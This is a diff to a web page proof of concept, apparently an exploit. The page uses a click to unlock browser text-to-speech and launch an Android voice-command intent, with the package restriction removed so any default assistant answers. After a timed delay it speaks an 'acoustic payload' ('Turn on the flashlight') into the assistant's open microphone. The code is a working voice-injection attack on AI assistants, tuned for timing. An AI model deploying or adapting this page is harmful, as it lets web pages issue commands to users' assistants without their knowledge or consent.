@@ -60,33 +60,30 @@
             exploited = true;
 
             // 1. UNLOCK THE TTS ENGINE
-            // Speaking an empty string synchronously tied to the click event 
-            // grants this page permission to use TTS later in the timeout.
             let unlockUtterance = new SpeechSynthesisUtterance("");
             window.speechSynthesis.speak(unlockUtterance);
 
             // 2. FIRE THE INTENT TO WAKE GEMINI
-            // We use the intent scheme to hit ACTION_VOICE_COMMAND and force route it to the Google App
+            // Removed the "package=" constraint so Android routes it globally to the default assistant
             let intentUrl = "intent:#Intent;" +
                 "action=android.intent.action.VOICE_COMMAND;" +
-                "package=com.google.android.googlequicksearchbox;" +
                 "launchFlags=0x10000000;" + // FLAG_ACTIVITY_NEW_TASK
                 "end";
             
             window.location.href = intentUrl;
 
             // 3. FIRE THE ACOUSTIC PAYLOAD
-            // Wait 600ms for the Android OS to slide Gemini up and grant it audio focus
+            // 500ms delay to hit the mic opening window exactly
             setTimeout(function() {
                 let payload = new SpeechSynthesisUtterance("Turn on the flashlight");
                 payload.lang = "en-US";
                 
-                // Slightly increase the rate so it finishes speaking before Gemini's VAD cuts it off
+                // Slightly increase the rate so it finishes before the mic times out
                 payload.rate = 1.2; 
                 payload.volume = 1.0;
                 
                 window.speechSynthesis.speak(payload);
-            }, 600); 
+            }, 500); 
         });
     </script>
 
